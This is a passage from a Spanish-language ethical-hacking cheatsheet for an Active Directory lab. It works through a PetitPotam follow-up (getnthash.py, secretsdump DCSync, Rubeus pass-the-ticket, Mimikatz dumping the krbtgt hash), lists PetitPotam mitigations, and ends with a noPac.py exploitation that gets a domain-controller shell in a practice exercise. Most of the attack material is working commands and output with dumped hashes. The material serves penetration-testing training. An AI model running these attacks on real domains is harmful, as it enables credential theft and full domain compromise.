SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

**Cómo enviar una solicitud TGS para nosotros mismos mediante getnthash.py**

También podemos tomar una ruta alternativa una vez que tengamos el TGT para nuestro objetivo. Con la herramienta `getnthash.py` de PKINITtools podríamos solicitar el hash NT para nuestro host/usuario objetivo utilizando Kerberos U2U para enviar una solicitud TGS con el [Certificado de atributo privilegiado (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) que contiene el hash NT para el objetivo. Esto se puede descifrar con la clave de cifrado AS-REP que obtuvimos al solicitar el TGT anteriormente.

```shell-session
afsh4ck@kali$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
313b6f423cd1ee07e91315b4919fb4ba
```

Luego podemos usar este hash para realizar un DCSync con secretsdump.py usando la flag `-hashes`

**Uso del hash NTLM del controlador de dominio para DCSync**

```shell-session
afsh4ck@kali$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

Como alternativa, una vez que obtenemos el certificado base64 a través de ntlmrelayx.py, podríamos usar el certificado con la herramienta Rubeus en un host de ataque de Windows para solicitar un ticket TGT y realizar un ataque pass-the-ticket (PTT) de una sola vez.

{% hint style="info" %}
**Nota**: Necesitaríamos usar el host de ataque MS01 que usamos en otras secciones, como la sección [ACLs](/ethical-hacking-cheatsheet/active-directory/active-directory/acls-access-control-lists.md) o [Acceso Privilegiado](/ethical-hacking-cheatsheet/active-directory/active-directory/acceso-privilegiado.md) una vez que tengamos el certificado base64 guardado en nuestras notas para realizar esto usando Rubeus.
{% endhint %}

### **Solicitud de TGT y ejecución de PTT con la cuenta de máquina DC01$**

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Building AS-REQ (w/ PKINIT preauth) for: 'INLANEFREIGHT.LOCAL\ACADEMY-EA-DC01$'
[*] Using domain controller: 172.16.5.5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
 doIGUDCCBkygAwIBBaEDAgEWooIFSDCCBURhggVAMIIFPKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggTyMIIE7qADAgEXoQMC
      AQKiggTgBIIE3IHVcI8Q7gEgvqZmbo2BFOclIQogbXr++rtdBdgL5MPlU2V15kXxx4vZaBRzBv6/e3MC
      exXtfUDZce8olUa1oy901BOhQNRuW0d9efigvnpL1fz0QwgLC0gcGtfPtQxJLTpLYWcDyViNdncjj76P
      IZJzOTbSXT1bNVFpM9YwXa/tYPbAFRAhr0aP49FkEUeRVoz2HDMre8gfN5y2abc5039Yf9zjvo78I/HH
      NmLWni29T9TDyfmU/xh/qkldGiaBrqOiUqC19X7unyEbafC6vr9er+j77TlMV88S3fUD/f1hPYMTCame
      svFXFNt5VMbRo3/wQ8+fbPNDsTF+NZRLTAGZOsEyTfNEfpw1nhOVnLKrPYyNwXpddOpoD58+DCU90FAZ
      g69yH2enKv+dNT84oQUxE+9gOFwKujYxDSB7g/2PUsfUh7hKhv3OkjEFOrzW3Xrh98yHrg6AtrENxL89
      CxOdSfj0HNrhVFgMpMepPxT5Sy2mX8WDsE1CWjckcqFUS6HCFwAxzTqILbO1mbNO9gWKhMPwyJDlENJq
      WdmLFmThiih7lClG05xNt56q2EY3y/m8Tpq8nyPey580TinHrkvCuE2hLeoiWdgBQiMPBUe23NRNxPHE
      PjrmxMU/HKr/BPnMobdfRafgYPCRObJVQynOJrummdx5scUWTevrCFZd+q3EQcnEyRXcvQJFDU3VVOHb
      Cfp+IYd5AXGyIxSmena/+uynzuqARUeRl1x/q8jhRh7ibIWnJV8YzV84zlSc4mdX4uVNNidLkxwCu2Y4
      K37BE6AWycYH7DjZEzCE4RSeRu5fy37M0u6Qvx7Y7S04huqy1Hbg0RFbIw48TRN6qJrKRUSKep1j19n6
      h3hw9z4LN3iGXC4Xr6AZzjHzY5GQFaviZQ34FEg4xF/Dkq4R3abDj+RWgFkgIl0B5y4oQxVRPHoQ+60n
      CXFC5KznsKgSBV8Tm35l6RoFN5Qa6VLvb+P5WPBuo7F0kqUzbPdzTLPCfx8MXt46Jbg305QcISC/QOFP
      T//e7l7AJbQ+GjQBaqY8qQXFD1Gl4tmiUkVMjIQrsYQzuL6D3Ffko/OOgtGuYZu8yO9wVwTQWAgbqEbw
      T2xd+SRCmElUHUQV0eId1lALJfE1DC/5w0++2srQTtLA4LHxb3L5dalF/fCDXjccoPj0+Q+vJmty0XGe
      +Dz6GyGsW8eiE7RRmLi+IPzL2UnOa4CO5xMAcGQWeoHT0hYmLdRcK9udkO6jmWi4OMmvKzO0QY6xuflN
      hLftjIYfDxWzqFoM4d3E1x/Jz4aTFKf4fbE3PFyMWQq98lBt3hZPbiDb1qchvYLNHyRxH3VHUQOaCIgL
      /vpppveSHvzkfq/3ft1gca6rCYx9Lzm8LjVosLXXbhXKttsKslmWZWf6kJ3Ym14nJYuq7OClcQzZKkb3
      EPovED0+mPyyhtE8SL0rnCxy1XEttnusQfasac4Xxt5XrERMQLvEDfy0mrOQDICTFH9gpFrzU7d2v87U
      HDnpr2gGLfZSDnh149ZVXxqe9sYMUqSbns6+UOv6EW3JPNwIsm7PLSyCDyeRgJxZYUl4XrdpPHcaX71k
      ybUAsMd3PhvSy9HAnJ/tAew3+t/CsvzddqHwgYBohK+eg0LhMZtbOWv7aWvsxEgplCgFXS18o4HzMIHw
      oAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARehEgQQd/AohN1w1ZZXsks8cCUlbqEVGxNJ
      TkxBTkVGUkVJR0hULkxPQ0FMoh0wG6ADAgEBoRQwEhsQQUNBREVNWS1FQS1EQzAxJKMHAwUAQOEAAKUR
      GA8yMDIyMDMzMDIyNTAyNVqmERgPMjAyMjAzMzEwODUwMjVapxEYDzIwMjIwNDA2MjI1MDI1WqgVGxNJ
      TkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
  ServiceRealm             :  INLANEFREIGHT.LOCAL
  UserName                 :  ACADEMY-EA-DC01$
  UserRealm                :  INLANEFREIGHT.LOCAL
  StartTime                :  3/30/2022 3:50:25 PM
  EndTime                  :  3/31/2022 1:50:25 AM
  RenewTill                :  4/6/2022 3:50:25 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  d/AohN1w1ZZXsks8cCUlbg==
  ASREP (key)              :  2A621F62C32241F38FA68826E95521DD
```

Luego podemos escribir `klist` para confirmar que el ticket está en la memoria.

**Confirmando que el ticket está en la memoria**

```powershell
PS C:\Tools> klist

Current LogonId is 0:0x4e56b

Cached Tickets: (3)

#0>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 3/30/2022 15:53:09 (local)
        End Time:   3/31/2022 1:50:25 (local)
        Renew Time: 4/6/2022 15:50:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

#1>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/30/2022 15:50:25 (local)
        End Time:   3/31/2022 1:50:25 (local)
        Renew Time: 4/6/2022 15:50:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#2>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
        Server: cifs/academy-ea-dc01 @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/30/2022 15:53:09 (local)
        End Time:   3/31/2022 1:50:25 (local)
        Renew Time: 4/6/2022 15:50:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

Nuevamente, dado que los controladores de dominio tienen privilegios de replicación en el dominio, podemos usar el método pass-the-ticket para realizar un ataque DCSync usando Mimikatz desde nuestro host de ataque de Windows. Aquí, obtenemos el hash NT para la cuenta KRBTGT, que podría usarse para crear un Golden Ticket y establecer la persistencia. Podríamos obtener el hash NT para cualquier usuario privilegiado que use DCSync y avanzar a la siguiente fase de nuestra evaluación.

### **Cómo realizar DCSync con Mimikatz**

```powershell
PS C:\Tools> cd .\mimikatz\x64\
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'inlanefreight\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 10/27/2021 8:14:34 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc
    ntlm- 0: 16e26ba33e455a8c338142af8d89ffbc
    lm  - 0: 4562458c201a97fa19365ce901513c21
```

***

### Mitigaciones de PetitPotam

En primer lugar, el parche para [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) debe aplicarse a todos los hosts afectados. A continuación, se indican algunas medidas de protección adicionales que se pueden tomar:

* Para evitar ataques de retransmisión NTLM, utilice [la Protección extendida para autenticación](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) junto con la habilitación [de Requerir SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) para permitir únicamente conexiones HTTPS para los servicios de Inscripción web de autoridad de certificación y Servicio web de inscripción de certificados.
* [Deshabilitar la autenticación NTLM](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) para controladores de dominio
* Deshabilitar NTLM en servidores AD CS mediante [la política de grupo](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
* Deshabilitar NTLM para IIS en servidores AD CS donde se utilizan los servicios de inscripción web de autoridad de certificación y servicio web de inscripción de certificados

Para obtener más información sobre los ataques a los servicios de certificados de Active Directory, recomiendo encarecidamente el documento técnico [Certified Pre-Owned,](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) ya que demuestra los ataques contra AD CS que se pueden realizar mediante llamadas API autenticadas. Esto demuestra que simplemente aplicar el parche CVE-2021-36942 solo para mitigar PetitPotam no es suficiente para la mayoría de las organizaciones que ejecutan AD CS, porque un atacante con credenciales de usuario de dominio estándar aún puede realizar ataques contra AD CS en muchos casos. El documento técnico también detalla otros pasos de detección y endurecimiento que se pueden tomar para endurecer AD CS.

***

## <mark style="color:purple;">Caso práctico</mark>

Aplique lo aprendido en esta sección para obtener un shell en DC01. Envíe el contenido de flag.txt ubicado en el directorio DailyTasks en el escritorio del Administrador.

Vamos a utilizar por ejemplo la vulnerabilidad noPac

#### Ejecutar noPac.py

```shell-session
afsh4ck@kali$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████                                           
                                        
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32>dir \flag.txt /s
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\Users\Administrator\Desktop\DailyTasks
 
 03/23/2022  04:29 AM                17 flag.txt
               1 File(s)             17 bytes
               
C:\Windows\system32>type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
D0ntSl@ckonN0P@c!
```

En este ejemplo vemos cómo:

1. Ejecutar noPac contra un Domain Controller
2. Buscar la flag en el sistema con `dir \flag.txt /s` (ya que no podemos movernos con cd y ls)
3. Leer la flag del directorio

***

## <mark style="color:purple;">Resumen</mark>

En esta sección cubrimos tres ataques recientes:

* [NoPac (SamAccountName Spoofing)](#nopac-samaccountname-spoofing)
* [PrintNightmare (de forma remota)](#printnightmare)
* [PetitPotam (MS-EFSRPC)](#petitpotam-ms-efsrpc)

Cada uno de estos ataques se puede realizar con acceso de usuario de dominio estándar (NoPac y PrintNightmare) o sin ningún tipo de autenticación en el dominio (PetitPotam), y puede provocar la vulneración del dominio con relativa facilidad. Hay varias formas de realizar cada ataque, y cubrimos algunas de ellas.&#x20;

Los ataques de Active Directory siguen evolucionando, y estos seguramente no serán los últimos vectores de ataque de alto impacto que veremos. Cuando se publiquen este tipo de ataques, debemos esforzarnos por crear un pequeño entorno de laboratorio para practicarlos, de modo que estemos listos para usarlos de manera segura y eficaz en un compromiso del mundo real si surge la oportunidad. Comprender cómo configurar estos ataques en un laboratorio también puede aumentar significativamente nuestra comprensión del problema y ayudarnos a asesorar mejor a nuestros clientes sobre el impacto, la remediación y las detecciones. Esto fue solo un pequeño vistazo al mundo de los ataques a AD CS, que podría ser un módulo completo.

En la siguiente sección, analizaremos otros problemas que vemos de vez en cuando en entornos de Active Directory y que podrían ayudarnos a mejorar nuestro acceso o generar hallazgos adicionales para nuestro informe final del cliente.
